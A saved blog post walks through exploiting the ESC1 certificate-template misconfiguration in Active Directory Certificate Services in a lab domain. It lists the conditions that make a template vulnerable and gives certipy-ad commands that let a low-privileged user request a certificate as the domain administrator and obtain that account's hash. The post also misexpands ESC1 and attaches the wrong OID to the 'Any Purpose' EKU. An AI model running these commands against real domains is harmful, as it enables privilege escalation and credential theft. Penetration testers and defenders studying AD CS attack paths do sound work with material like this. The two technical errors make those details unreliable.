<!DOCTYPE html>
<!-- saved from url=(0114)https://0xc4t.github.io/content.html?p=md/esc1-ad-cs-misconfigurations-exploitation-active-airectory-pentesting.md -->
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ESC1 ADCS Misconfigurations exploitation — Active Directory Pentesting</title>
    <link rel="icon" type="image/x-icon" href="https://pbs.twimg.com/profile_images/1960719102932344837/T8Sl7V0i_400x400.jpg">
    <meta property="og:type" content="website">
    <meta property="og:title" content="ESC1 ADCS Misconfigurations exploitation — Active Directory Pentesting">
    <meta property="og:description" content="ESC1 is a privilege escalation path in Active Directory through misuse of Certificate Template misconfiguration in AD CS. If a particular template meets the requirements, an attacker with a low-privileged account can request a certificate on behalf of a privileged account and use that certificate to PKINIT Kerberos TGT, then login as that account.">
    <meta property="og:site_name" content="0xc4t Posts">
    <meta property="og:image" content="https://miro.medium.com/v2/resize:fit:720/format:webp/1*DienrCuhoA1O6TG_5LcBWQ.png">
    <meta property="og:image:width" content="1200">
    <meta property="og:image:height" content="630">
    <link rel="stylesheet" href="../../style.css">
    <link rel="icon" type="image/x-icon" href="https://pbs.twimg.com/profile_images/1960719102932344837/T8Sl7V0i_400x400.jpg">
    <script defer src='https://static.cloudflareinsights.com/beacon.min.js' data-cf-beacon='{"token": "81ab0317a4f24dde96e3b68dd2b1e0e3"}'></script>
  </head>
  <body>
    <h1>./0xc4t.re</h1>
    <p class="slogan">
      <i>Web Security &amp; Active Directory Security</i>
    </p>
    <nav>
      <a href="/">Posts</a>
    </nav>
    <hr>
    <div id="content" class="content"><h2>AD CS Attack Paths Series: ESC1 Certificate Template misconfiguration</h2>
<p>Active Directory Certificate Services (AD CS) is one of the most frequently used services in an Active Directory environment, especially for creating digital certificates such as email, web, and other certificates.</p>
<p>In this article, I will try to explain how to exploit the ESC1 (Enterprise Subordinate CA 1) vulnerability. This article was created as a personal note in case I encounter a similar case or similar situation in the future.</p>
<p>In the future, I also plan to discuss the exploitation of ESC2 to ESC9, so that this documentation can be a complete reference in understanding the potential risks in AD CS implementation.</p>
<h3>ESC1 Background</h3>
<p>ESC1 is a privilege escalation path in Active Directory through misuse of Certificate Template misconfiguration in AD CS. If a particular template meets the requirements, an attacker with a low-privileged account can request a certificate on behalf of a privileged account and use that certificate to PKINIT Kerberos TGT, then login as that account. <a href="https://www.semperis.com/blog/esc1-attack-explained/#:~:text=Enterprise%20CA%20Security%20Configuration%20(ESC1,administrator&#39;s%20lives%20easier%3A%20certificate%20templates.">Detail</a></p>
<h3>Conditions for ESC1 to be exploited</h3>
<p>ENROLLEE_SUPPLIES_SUBJECT</p>
<ul>
<li>Users can specify their own Subject Alternative Name (SAN) in the CSR.</li>
</ul>
<p>EKU “Any Purpose” (1.3.6.1.5.5.7.3.3)</p>
<ul>
<li>The certificate can be used for authentication.</li>
</ul>
<p>No Manager Approval Required</p>
<ul>
<li>Certificates are issued automatically without review.</li>
</ul>
<p>Accessible to Low-Privilege Users</p>
<ul>
<li>Enroll permissions are granted to Domain Users or Authenticated Users groups.</li>
</ul>
<h3>Enumeration and Exploitation</h3>
<p>Let’s enumerate certificate templates with the certifpy tool, you can get this tool through the repository if you are using kali linux.</p>
<pre><code>certipy-ad find -u 'domain-user@shift.local' -p 'password' -dc-ip 10.10.10.10 -vulnerable -enabled

</code></pre>
<p><img src="1_DienrCuhoA1O6TG_5LcBWQ.webp" alt="Image 1"></p>
<p><img src="1_VOIAWPdMDyTDv-m0XE0tDw.webp" alt="Image 2"></p>
<p><img src="1_TaqMheUx5-J0aZoe-jNxGw.webp" alt="Image 3"></p>
<p>From the enumeration results, we found that the template we created earlier is vulnerable to ESC1 because the EnrollMent Right is to the user’s domain and can supply the subject.</p>
<p>Let’s try to exploit and get the hash of the Domain Admin, namely the Administrator of this DC01 Letsgoo</p>
<pre><code>certipy-ad req -u 'elena.petrova@shift.local' -p 'qwerty1234' -dc-ip 10.10.10.10 -ca shift-DC01-CA -target 'DC01.shift.local' -template 'Template_ESC1' -upn 'administrator@shift.local'

</code></pre>
<p><img src="1_hGWVG4CTyOJbYdJ9zew6Mg.webp" alt="Image 4"></p>
<p>Extract administrator.pfx to get the hash of the administrator</p>
<pre><code> certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.10.10
</code></pre>
<p><img src="1_Be-UOOU6muBPV09j4KZiSw.webp" alt="Image 5"></p>
<p><img src="1_GMMkSkrngMmEauKoA9vwlw.webp" alt="Image 6"></p>
<p>Nice we have successfully created a lab and exploited the ESC1 vulnerability, hopefully this article can help you in the Active Directory Pentesting project, sorry if something is missed, don’t forget to comment below if there are errors in the explanation, I am very open to criticism, Thanks All</p>
</div>

    <div class="social-icons">
      <a href="https://www.instagram.com/0xc4t?utm_source=ig_web_button_share_sheet&amp;igsh=ZDNlZDc0MzIxNw==" target="_blank"><i class="fab fa-instagram"></i></a>
      <a href="https://x.com/0x0c4t" target="_blank"><i class="fab fa-x-twitter"></i></a>
    </div>
    <div class="footer">
      © 2025 0xc4t
    </div>


</body></html>
